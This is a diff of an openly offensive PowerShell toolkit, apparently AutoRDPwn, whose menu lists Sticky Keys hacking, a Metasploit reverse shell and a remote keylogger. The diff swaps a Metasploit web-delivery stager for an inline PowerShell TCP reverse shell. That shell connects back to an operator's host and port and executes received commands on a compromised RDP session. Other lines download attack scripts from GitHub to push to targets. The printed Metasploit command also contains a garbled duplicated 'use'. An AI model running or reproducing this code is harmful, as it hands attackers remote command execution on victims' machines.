@@ -424,7 +424,7 @@ function Remove-Exclusions {
         
         if($module -like '5') { Show-Banner
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - Sticky Keys Hacking" -ForegroundColor Gray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Metasploit Web Delivery" -ForegroundColor Gray
+        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Metasploit Reverse Shell" -ForegroundColor Gray
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - Remote Keylogger" -ForegroundColor Gray
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
@@ -435,13 +435,11 @@ function Remove-Exclusions {
 
         if($backdoor -like '2') { $metasploit = "true" ; Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 
         $metarandom = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_}) ; Write-Host
-        Write-host "[?] $txt65" -NoNewLine -ForegroundColor Gray ; $metaserver = $Host.UI.ReadLine() ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-        Write-Host ; Write-Host "[!] $txt63" -ForegroundColor Red ; Write-Host ; Write-host "use exploit/multi/script/web_delivery"
-        Write-host "set SRVHOST $metaserver" ; Write-host "set SRVPORT 4433" ; Write-host "set SSL false" ; Write-host "set target 2"
-        Write-host "set payload windows/meterpreter/reverse_tcp" ; Write-host "set LHOST $metaserver"
-        Write-host "set ExitOnSession false" ; Write-host "set EnableStageEncoding true"
-        Write-host "set LPORT 4444" ; Write-host "set URIPATH $metarandom" ; Write-host "exploit"
-        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }
+        Write-host "[?] $txt65" -NoNewLine -ForegroundColor Gray ; $metahost = $Host.UI.ReadLine() ; Write-Host
+        Write-host "[?] $txt43" -NoNewLine -ForegroundColor Gray ; $metaport = $Host.UI.ReadLine() ; $Host.UI.RawUI.ForegroundColor = 'Gray'
+        Write-Host ; Write-Host "[!] $txt63" -ForegroundColor Red ; Write-Host ; Write-host "use use exploit/multi/handler"
+        Write-host "set payload windows/shell/reverse_tcp" ; Write-host "set SRVHOST $metahost" ; Write-host "set LPORT $metaport"  
+        Write-host "exploit" ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }
 
         if($backdoor -like '3') { $getkeys = "true" ; Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }
 
@@ -622,11 +620,12 @@ Write-Host "Powershell Web Server -->` " -NoNewLine -ForegroundColor Green ; Wri
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host }
 (New-Object -Com Shell.Application).Open("http://$computer`:8080") ; invoke-command -session $RDP[0] -scriptblock ${function:Start-WebServer}}
 
-if ($metasploit){ $metascript = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-MetasploitPayload.ps1')
-invoke-command -session $RDP[0] -scriptblock { Set-Content -Value $using:metascript -Path Invoke-MetasploitPayload.ps1 ; Import-Module .\Invoke-MetasploitPayload.ps1 ; Write-Host
-Write-Host "==================== Metasploit Web Delivery =========================" -ForegroundColor Gray
-Invoke-MetasploitPayload "http://$using:metaserver`:4433/$using:metarandom" -verbose
-Write-Host "======================================================================" -ForegroundColor Gray ; Write-Host ; Start-Sleep -milliseconds 7500 ; del .\Invoke-MetasploitPayload.ps1 }}
+if ($metasploit){ Write-Host ; Write-Host "[+] Loading Metasploit Reverse Shell.." -ForegroundColor Blue ; Write-Host ; Start-Sleep -milliseconds 2000
+Write-Host "[!] Waiting until Metasploit Reverse Shell is working.." -ForegroundColor Red
+$metashell = $client = New-Object System.Net.Sockets.TCPClient("$metahost",$metaport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = 
+(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = 
+([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+invoke-command -session $RDP[0] -scriptblock { Invoke-Expression $using:metashell ; Start-Sleep -milliseconds 2000 }}
 
 if ($netcat -in 'local'){ $netcatpsone = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PowerShellTcp.ps1')
 invoke-command -session $RDP[0] -scriptblock { Set-Content -Value $using:netcatpsone -Path Invoke-PowerShellTcp.ps1 ; Import-Module .\Invoke-PowerShellTcp.ps1
